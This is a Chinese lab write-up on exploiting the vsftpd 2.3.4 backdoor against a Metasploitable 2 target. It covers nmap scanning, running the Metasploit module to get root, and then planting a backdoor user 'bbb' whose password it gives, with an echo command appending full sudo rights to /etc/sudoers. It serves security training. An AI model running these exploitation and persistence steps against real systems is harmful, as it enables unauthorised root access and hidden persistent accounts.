---
typora-root-url: ./笑脸漏洞(vsftpd 2.3.assets
---

# 笑脸漏洞(vsftpd 2.3.4)

### 漏洞原理

VSFTPD（Very Secure FTP Daemon）是一个常用的FTP服务器软件。 "vsftpd 2.3.4 Backdoor"（也称为 "vsFTPd 2.3.4 Backdoor" 或 "vsftpd v2.3.4 backdoor"）。该漏洞最初于2011年被公开发现，影响了VSFTPD 2.3.4版本。这个版本中的一个后门（backdoor）允许攻击者通过一个特殊的用户名和密码组合来获得未经授权的访问权限。这个后门的存在可能导致攻击者执行恶意操作，例如未经授权地访问和修改FTP服务器上的文件。

### 环境

##### 攻击机

- kali3-amd64 (2022-11-07) x86_64 GNU/Linux

##### 靶场

- metasploitable 2.6.24-16-server

## 攻击记录

#### 第一步:

查询目标靶场IP地址 

```	
ifconfig
```

![clip_image002-1689145550679-2](/clip_image002-1689145550679-2.jpg)

#### 第二步:

ping通靶场 证明可以进行正常连接

```
ping IP address
```

![img](/clip_image002.jpg)



#### 第三步：

在Kali中用nmap扫描目标主机的21端口，发现该靶场的ftp的版本存在笑脸漏洞(在检测到用户名带有特殊字符”:)” )时，会自动打开6200端口，使用nc即可进行连接这个端口，取得管理员权限

```
nmap -p 21 -sV IP address
```

![img](/clip_image002-1689146830333-5.jpg)

#### 第四步

使用Metasploit 对该漏洞进行攻击

```
启动msfconsole
```

![img](/clip_image002-1689146835765-7.jpg)

```
search vsftpd (搜索vsftpd漏洞)
```

![img](/clip_image002-1689146839850-9.jpg)

```	
show option
```

![img](/clip_image002-1689146844673-11.jpg

``` 
use 0
run
```

![img](/clip_image002-1689146876091-13.jpg)

成功获得root权限

![img](/clip_image002-1689146915517-17.jpg)



#### 第五步

获得靶场权限，添加一个用户bbb （用户名:bbb 密码:666）

``` shell
useradd bbb
passwd bbb
```

![img](/clip_image001-1689146911390-15.png)

#### 第六步

给我们自己用户获得root 权限

修改/etc/sudoers文件

``` shell
echo "bbb ALL=(ALL) ALL" | tee -a /etc/sudoers
```

### ![img](/clip_image002-1689147014225-19.jpg)

成功写入！

### 结果检测

- 用户bbb登陆靶场

![img](/clip_image002-1689147032724-23.jpg)

- 用户bbb可以查看/etc/sudoers文件 提权成功！
- ![img](/clip_image002-1689147036253-25.jpg)

